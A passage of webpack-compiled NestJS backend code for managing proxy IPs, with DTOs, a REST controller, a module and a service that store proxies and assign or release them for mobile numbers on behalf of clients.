    (0, class_validator_1.IsEnum)(['http', 'https', 'socks5']),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "protocol", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'username', description: 'Username for proxy authentication', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'password', description: 'Password for proxy authentication', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'], required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(['active', 'inactive']),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns this IP', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "assignedToClient", void 0);


/***/ }),

/***/ "./src/components/ip-management/dto/update-proxy-ip.dto.ts":
/*!*****************************************************************!*\
  !*** ./src/components/ip-management/dto/update-proxy-ip.dto.ts ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateProxyIpDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_proxy_ip_dto_1 = __webpack_require__(/*! ./create-proxy-ip.dto */ "./src/components/ip-management/dto/create-proxy-ip.dto.ts");
class UpdateProxyIpDto extends (0, swagger_1.PartialType)(create_proxy_ip_dto_1.CreateProxyIpDto) {
}
exports.UpdateProxyIpDto = UpdateProxyIpDto;


/***/ }),

/***/ "./src/components/ip-management/ip-management.controller.ts":
/*!******************************************************************!*\
  !*** ./src/components/ip-management/ip-management.controller.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpManagementController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const ip_management_service_1 = __webpack_require__(/*! ./ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
const create_proxy_ip_dto_1 = __webpack_require__(/*! ./dto/create-proxy-ip.dto */ "./src/components/ip-management/dto/create-proxy-ip.dto.ts");
const update_proxy_ip_dto_1 = __webpack_require__(/*! ./dto/update-proxy-ip.dto */ "./src/components/ip-management/dto/update-proxy-ip.dto.ts");
const assign_ip_dto_1 = __webpack_require__(/*! ./dto/assign-ip.dto */ "./src/components/ip-management/dto/assign-ip.dto.ts");
const proxy_ip_schema_1 = __webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts");
const ip_mobile_mapping_schema_1 = __webpack_require__(/*! ./schemas/ip-mobile-mapping.schema */ "./src/components/ip-management/schemas/ip-mobile-mapping.schema.ts");
let IpManagementController = class IpManagementController {
    constructor(ipManagementService) {
        this.ipManagementService = ipManagementService;
    }
    async createProxyIp(createProxyIpDto) {
        try {
            return await this.ipManagementService.createProxyIp(createProxyIpDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async bulkCreateProxyIps(proxyIps) {
        try {
            return await this.ipManagementService.bulkCreateProxyIps(proxyIps);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getAllProxyIps() {
        try {
            return await this.ipManagementService.findAllProxyIps();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async updateProxyIp(ipAddress, port, updateProxyIpDto) {
        try {
            return await this.ipManagementService.updateProxyIp(ipAddress, parseInt(port), updateProxyIpDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async deleteProxyIp(ipAddress, port) {
        try {
            await this.ipManagementService.deleteProxyIp(ipAddress, parseInt(port));
            return { message: 'Proxy IP deleted successfully' };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getIpForMobile(mobile) {
        try {
            const ipAddress = await this.ipManagementService.getIpForMobile(mobile);
            return { mobile, ipAddress };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async assignIpToMobile(assignDto) {
        try {
            return await this.ipManagementService.assignIpToMobile(assignDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async bulkAssignIps(bulkAssignDto) {
        try {
            return await this.ipManagementService.bulkAssignIpsToMobiles(bulkAssignDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async releaseIpFromMobile(mobile, releaseDto) {
        try {
            releaseDto.mobile = mobile;
            await this.ipManagementService.releaseIpFromMobile(releaseDto);
            return { message: 'IP released successfully' };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getClientMappings(clientId) {
        try {
            return await this.ipManagementService.getClientMobileMappings(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getStatistics() {
        try {
            return await this.ipManagementService.getStats();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async getHealthStatus() {
        try {
            return await this.ipManagementService.healthCheck();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async getProxyIpById(ipAddress, port) {
        try {
            return await this.ipManagementService.findProxyIpById(ipAddress, parseInt(port));
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async getClientAssignedIps(clientId) {
        try {
            return await this.ipManagementService.getClientAssignedIps(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getAvailableIpCount() {
        try {
            const count = await this.ipManagementService.getAvailableIpCount();
            return { count };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
};
exports.IpManagementController = IpManagementController;
__decorate([
    (0, common_1.Post)('proxy-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new proxy IP' }),
    (0, swagger_1.ApiBody)({ type: create_proxy_ip_dto_1.CreateProxyIpDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP created successfully', type: proxy_ip_schema_1.ProxyIp }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid input data' }),
    (0, swagger_1.ApiConflictResponse)({ description: 'Proxy IP already exists' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_proxy_ip_dto_1.CreateProxyIpDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "createProxyIp", null);
__decorate([
    (0, common_1.Post)('proxy-ips/bulk'),
    (0, swagger_1.ApiOperation)({ summary: 'Bulk create proxy IPs' }),
    (0, swagger_1.ApiBody)({ type: [create_proxy_ip_dto_1.CreateProxyIpDto] }),
    (0, swagger_1.ApiOkResponse)({ description: 'Bulk creation completed' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "bulkCreateProxyIps", null);
__decorate([
    (0, common_1.Get)('proxy-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all proxy IPs' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IPs retrieved successfully', type: [proxy_ip_schema_1.ProxyIp] }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getAllProxyIps", null);
__decorate([
    (0, common_1.Put)('proxy-ips/:ipAddress/:port'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a proxy IP' }),
    (0, swagger_1.ApiParam)({ name: 'ipAddress', description: 'IP address' }),
    (0, swagger_1.ApiParam)({ name: 'port', description: 'Port number' }),
    (0, swagger_1.ApiBody)({ type: update_proxy_ip_dto_1.UpdateProxyIpDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP updated successfully', type: proxy_ip_schema_1.ProxyIp }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Proxy IP not found' }),
    __param(0, (0, common_1.Param)('ipAddress')),
    __param(1, (0, common_1.Param)('port')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_proxy_ip_dto_1.UpdateProxyIpDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "updateProxyIp", null);
__decorate([
    (0, common_1.Delete)('proxy-ips/:ipAddress/:port'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a proxy IP' }),
    (0, swagger_1.ApiParam)({ name: 'ipAddress', description: 'IP address' }),
    (0, swagger_1.ApiParam)({ name: 'port', description: 'Port number' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP deleted successfully' }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Proxy IP not found' }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Cannot delete assigned IP' }),
    __param(0, (0, common_1.Param)('ipAddress')),
    __param(1, (0, common_1.Param)('port')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "deleteProxyIp", null);
__decorate([
    (0, common_1.Get)('mappings/mobile/:mobile/ip'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP address assigned to a mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number' }),
    (0, swagger_1.ApiOkResponse)({ description: 'IP address found' }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'No IP assigned to this mobile' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getIpForMobile", null);
__decorate([
    (0, common_1.Post)('assign'),
    (0, swagger_1.ApiOperation)({ summary: 'Assign an IP to a mobile number' }),
    (0, swagger_1.ApiBody)({ type: assign_ip_dto_1.AssignIpToMobileDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'IP assigned successfully', type: ip_mobile_mapping_schema_1.IpMobileMapping }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Assignment failed' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [assign_ip_dto_1.AssignIpToMobileDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "assignIpToMobile", null);
__decorate([
    (0, common_1.Post)('assign/bulk'),
    (0, swagger_1.ApiOperation)({ summary: 'Bulk assign IPs to multiple mobile numbers' }),
    (0, swagger_1.ApiBody)({ type: assign_ip_dto_1.BulkAssignIpDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'Bulk assignment completed' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [assign_ip_dto_1.BulkAssignIpDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "bulkAssignIps", null);
__decorate([
    (0, common_1.Delete)('assign/mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Release IP from a mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number' }),
    (0, swagger_1.ApiBody)({ type: assign_ip_dto_1.ReleaseIpFromMobileDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'IP released successfully' }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'No IP assignment found for mobile' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, assign_ip_dto_1.ReleaseIpFromMobileDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "releaseIpFromMobile", null);
__decorate([
    (0, common_1.Get)('clients/:clientId/mappings'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all mobile mappings for a client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Client mappings retrieved successfully', type: [ip_mobile_mapping_schema_1.IpMobileMapping] }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getClientMappings", null);
__decorate([
    (0, common_1.Get)('statistics'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP management statistics' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Statistics retrieved successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getStatistics", null);
__decorate([
    (0, common_1.Get)('health'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP management health status' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Health status retrieved successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getHealthStatus", null);
__decorate([
    (0, common_1.Get)('proxy-ips/:ipAddress/:port'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a specific proxy IP' }),
    (0, swagger_1.ApiParam)({ name: 'ipAddress', description: 'IP address' }),
    (0, swagger_1.ApiParam)({ name: 'port', description: 'Port number' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP found', type: proxy_ip_schema_1.ProxyIp }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Proxy IP not found' }),
    __param(0, (0, common_1.Param)('ipAddress')),
    __param(1, (0, common_1.Param)('port')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getProxyIpById", null);
__decorate([
    (0, common_1.Get)('clients/:clientId/assigned-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all IPs assigned to a client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Client assigned IPs retrieved successfully', type: [proxy_ip_schema_1.ProxyIp] }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getClientAssignedIps", null);
__decorate([
    (0, common_1.Get)('available-count'),
    (0, swagger_1.ApiOperation)({ summary: 'Get count of available IPs' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Available IP count retrieved successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getAvailableIpCount", null);
exports.IpManagementController = IpManagementController = __decorate([
    (0, swagger_1.ApiTags)('IP Management'),
    (0, common_1.Controller)('ip-management'),
    __metadata("design:paramtypes", [ip_management_service_1.IpManagementService])
], IpManagementController);


/***/ }),

/***/ "./src/components/ip-management/ip-management.module.ts":
/*!**************************************************************!*\
  !*** ./src/components/ip-management/ip-management.module.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpManagementModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const ip_management_controller_1 = __webpack_require__(/*! ./ip-management.controller */ "./src/components/ip-management/ip-management.controller.ts");
const ip_management_service_1 = __webpack_require__(/*! ./ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
const client_ip_integration_service_1 = __webpack_require__(/*! ./client-ip-integration.service */ "./src/components/ip-management/client-ip-integration.service.ts");
const client_ip_integration_controller_1 = __webpack_require__(/*! ./client-ip-integration.controller */ "./src/components/ip-management/client-ip-integration.controller.ts");
const proxy_ip_schema_1 = __webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts");
const ip_mobile_mapping_schema_1 = __webpack_require__(/*! ./schemas/ip-mobile-mapping.schema */ "./src/components/ip-management/schemas/ip-mobile-mapping.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
let IpManagementModule = class IpManagementModule {
};
exports.IpManagementModule = IpManagementModule;
exports.IpManagementModule = IpManagementModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([
                { name: proxy_ip_schema_1.ProxyIp.name, schema: proxy_ip_schema_1.ProxyIpSchema },
                { name: ip_mobile_mapping_schema_1.IpMobileMapping.name, schema: ip_mobile_mapping_schema_1.IpMobileMappingSchema }
            ]),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule)
        ],
        controllers: [ip_management_controller_1.IpManagementController, client_ip_integration_controller_1.ClientIpIntegrationController],
        providers: [ip_management_service_1.IpManagementService, client_ip_integration_service_1.ClientIpIntegrationService],
        exports: [ip_management_service_1.IpManagementService, client_ip_integration_service_1.ClientIpIntegrationService]
    })
], IpManagementModule);


/***/ }),

/***/ "./src/components/ip-management/ip-management.service.ts":
/*!***************************************************************!*\
  !*** ./src/components/ip-management/ip-management.service.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var IpManagementService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpManagementService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const proxy_ip_schema_1 = __webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts");
const ip_mobile_mapping_schema_1 = __webpack_require__(/*! ./schemas/ip-mobile-mapping.schema */ "./src/components/ip-management/schemas/ip-mobile-mapping.schema.ts");
let IpManagementService = IpManagementService_1 = class IpManagementService {
    constructor(proxyIpModel, ipMobileMappingModel) {
        this.proxyIpModel = proxyIpModel;
        this.ipMobileMappingModel = ipMobileMappingModel;
        this.logger = new common_1.Logger(IpManagementService_1.name);
    }
    async createProxyIp(createProxyIpDto) {
        if (!createProxyIpDto.ipAddress || !createProxyIpDto.port) {
            throw new common_1.BadRequestException('IP address and port are required');
        }
        if (createProxyIpDto.port < 1 || createProxyIpDto.port > 65535) {
            throw new common_1.BadRequestException('Port must be between 1 and 65535');
        }
        this.logger.debug(`Creating new proxy IP: ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}`);
        try {
            const existingIp = await this.proxyIpModel.findOne({
                ipAddress: createProxyIpDto.ipAddress,
                port: createProxyIpDto.port
            });
            if (existingIp) {
                throw new common_1.ConflictException(`Proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port} already exists`);
            }
            const createdIp = new this.proxyIpModel(createProxyIpDto);
            const savedIp = await createdIp.save();
            this.logger.log(`Created proxy IP: ${savedIp.ipAddress}:${savedIp.port}`);
            return savedIp.toJSON();
        }
        catch (error) {
            if (error instanceof common_1.ConflictException || error instanceof common_1.BadRequestException) {
                throw error;
            }
            this.logger.error(`Failed to create proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to create proxy IP: ${error.message}`);
        }
    }
    async bulkCreateProxyIps(proxyIps) {
        if (!proxyIps || proxyIps.length === 0) {
            throw new common_1.BadRequestException('No proxy IPs provided for bulk creation');
        }
        this.logger.debug(`Bulk creating ${proxyIps.length} proxy IPs`);
        let created = 0;
        let failed = 0;
        const errors = [];
        const batchSize = 10;
        for (let i = 0; i < proxyIps.length; i += batchSize) {
            const batch = proxyIps.slice(i, i + batchSize);
            for (const ipDto of batch) {
                try {
                    if (!ipDto.ipAddress || !ipDto.port) {
                        failed++;
                        errors.push(`Invalid IP data: missing address or port`);
                        continue;
                    }
                    await this.createProxyIp(ipDto);
                    created++;
                }
                catch (error) {
                    failed++;
                    errors.push(`${ipDto.ipAddress}:${ipDto.port} - ${error.message}`);
                }
            }
        }
        this.logger.log(`Bulk creation completed: ${created} created, ${failed} failed`);
        return { created, failed, errors };
    }
    async findAllProxyIps() {
        return this.proxyIpModel.find().lean();
    }
    async getAvailableProxyIps() {
        return this.proxyIpModel.find({
            status: 'active',
            isAssigned: false
        }).lean();
    }
    async updateProxyIp(ipAddress, port, updateDto) {
        this.logger.debug(`Updating proxy IP: ${ipAddress}:${port}`);
        const updatedIp = await this.proxyIpModel.findOneAndUpdate({ ipAddress, port }, { $set: updateDto }, { new: true }).lean();
        if (!updatedIp) {
            throw new common_1.NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);
        }
        this.logger.log(`Updated proxy IP: ${ipAddress}:${port}`);
        return updatedIp;
    }
    async deleteProxyIp(ipAddress, port) {
        this.logger.debug(`Deleting proxy IP: ${ipAddress}:${port}`);
        const mapping = await this.ipMobileMappingModel.findOne({
            ipAddress: `${ipAddress}:${port}`,
            status: 'active'
        });
        if (mapping) {
            throw new common_1.BadRequestException(`Cannot delete IP ${ipAddress}:${port} - it is currently assigned to mobile ${mapping.mobile}`);
        }
        const result = await this.proxyIpModel.deleteOne({ ipAddress, port });
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);
        }
        this.logger.log(`Deleted proxy IP: ${ipAddress}:${port}`);
    }
    async getIpForMobile(mobile) {
        if (!mobile || mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        this.logger.debug(`Getting IP for mobile: ${mobile}`);
        try {
            const mapping = await this.ipMobileMappingModel.findOne({
                mobile: mobile.trim(),
                status: 'active'
            }).lean();
            return mapping ? mapping.ipAddress : null;
        }
        catch (error) {
            this.logger.error(`Error getting IP for mobile ${mobile}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to get IP for mobile: ${error.message}`);
        }
    }
    async assignIpToMobile(assignDto) {
        if (!assignDto.mobile || assignDto.mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        if (!assignDto.clientId || assignDto.clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required');
        }
        const mobile = assignDto.mobile.trim();
        const clientId = assignDto.clientId.trim();
        this.logger.debug(`Assigning IP to mobile: ${mobile}`);
        try {
            const existingMapping = await this.ipMobileMappingModel.findOne({
                mobile,
                status: 'active'
            });
            if (existingMapping) {
                this.logger.debug(`Mobile ${mobile} already has IP: ${existingMapping.ipAddress}`);
                return existingMapping;
            }
            let selectedIp;
            if (assignDto.preferredIp) {
                const [ipAddress, portStr] = assignDto.preferredIp.split(':');
                const port = parseInt(portStr);
                if (isNaN(port)) {
                    throw new common_1.BadRequestException(`Invalid port in preferred IP: ${assignDto.preferredIp}`);
                }
                selectedIp = await this.proxyIpModel.findOne({
                    ipAddress,
                    port,
                    status: 'active',
                    isAssigned: false
                }).lean();
                if (!selectedIp) {
                    throw new common_1.NotFoundException(`Preferred IP ${assignDto.preferredIp} not available`);
                }
            }
            else {
                let retries = 3;
                while (retries > 0 && !selectedIp) {
                    selectedIp = await this.proxyIpModel.findOne({
                        status: 'active',
                        isAssigned: false
                    }).lean();
                    if (!selectedIp) {
                        break;
                    }
                    const updateResult = await this.proxyIpModel.updateOne({
                        ipAddress: selectedIp.ipAddress,
                        port: selectedIp.port,
                        isAssigned: false
                    }, {
                        $set: {
                            isAssigned: true,
                            assignedToClient: clientId
                        }
                    });
                    if (updateResult.modifiedCount === 0) {
                        selectedIp = null;
                        retries--;
                        continue;
                    }
                    break;
                }
                if (!selectedIp) {
                    throw new common_1.NotFoundException('No available proxy IPs');
                }
            }
            const mappingDto = {
                mobile,
                ipAddress: `${selectedIp.ipAddress}:${selectedIp.port}`,
                clientId,
                status: 'active'
            };
            let newMapping;
            if (assignDto.preferredIp) {
                const [mapping] = await Promise.all([
                    this.ipMobileMappingModel.create(mappingDto),
                    this.proxyIpModel.updateOne({ ipAddress: selectedIp.ipAddress, port: selectedIp.port }, { $set: { isAssigned: true, assignedToClient: clientId } })
                ]);
                newMapping = mapping;
            }
            else {
                newMapping = await this.ipMobileMappingModel.create(mappingDto);
            }
            this.logger.log(`Assigned IP ${mappingDto.ipAddress} to mobile ${mobile}`);
            return newMapping.toObject ? newMapping.toObject() : newMapping;
        }
        catch (error) {
            this.logger.error(`Failed to assign IP to mobile ${mobile}: ${error.message}`);
            if (error instanceof common_1.NotFoundException || error instanceof common_1.BadRequestException) {
                throw error;
            }
            throw new common_1.BadRequestException(`Failed to assign IP to mobile: ${error.message}`);
        }
    }
    async bulkAssignIpsToMobiles(bulkDto) {
        if (!bulkDto.mobiles || bulkDto.mobiles.length === 0) {
            throw new common_1.BadRequestException('No mobiles provided for bulk assignment');
        }
        if (!bulkDto.clientId || bulkDto.clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required for bulk assignment');
        }
        this.logger.debug(`Bulk assigning IPs to ${bulkDto.mobiles.length} mobiles`);
        let assigned = 0;
        let failed = 0;
        const results = [];
        const batchSize = 5;
        for (let i = 0; i < bulkDto.mobiles.length; i += batchSize) {
            const batch = bulkDto.mobiles.slice(i, i + batchSize);
            for (const mobile of batch) {
                if (!mobile || mobile.trim() === '') {
                    failed++;
                    results.push({ mobile: mobile || 'undefined', error: 'Invalid mobile number' });
                    continue;
                }
                try {
                    const assignDto = {
                        mobile: mobile.trim(),
                        clientId: bulkDto.clientId.trim()
                    };
                    const mapping = await this.assignIpToMobile(assignDto);
                    assigned++;
                    results.push({ mobile: mobile.trim(), ipAddress: mapping.ipAddress });
                }
                catch (error) {
                    failed++;
                    results.push({ mobile: mobile.trim(), error: error.message });
                    this.logger.warn(`Failed to assign IP to mobile ${mobile}: ${error.message}`);
                }
            }
        }
        this.logger.log(`Bulk assignment completed: ${assigned} assigned, ${failed} failed`);
        return { assigned, failed, results };
    }
    async releaseIpFromMobile(releaseDto) {
        if (!releaseDto.mobile || releaseDto.mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        const mobile = releaseDto.mobile.trim();
        this.logger.debug(`Releasing IP from mobile: ${mobile}`);
        try {
            const mapping = await this.ipMobileMappingModel.findOne({
                mobile,
                status: 'active'
            });
            if (!mapping) {
                throw new common_1.NotFoundException(`No active IP mapping found for mobile: ${mobile}`);
            }
            const [ipAddress, portStr] = mapping.ipAddress.split(':');
            const port = parseInt(portStr);
            if (isNaN(port)) {
                this.logger.error(`Invalid port in IP address: ${mapping.ipAddress}`);
                throw new common_1.BadRequestException(`Invalid IP address format: ${mapping.ipAddress}`);
            }
            await Promise.all([
                this.ipMobileMappingModel.updateOne({ mobile, status: 'active' }, { $set: { status: 'inactive' } }),
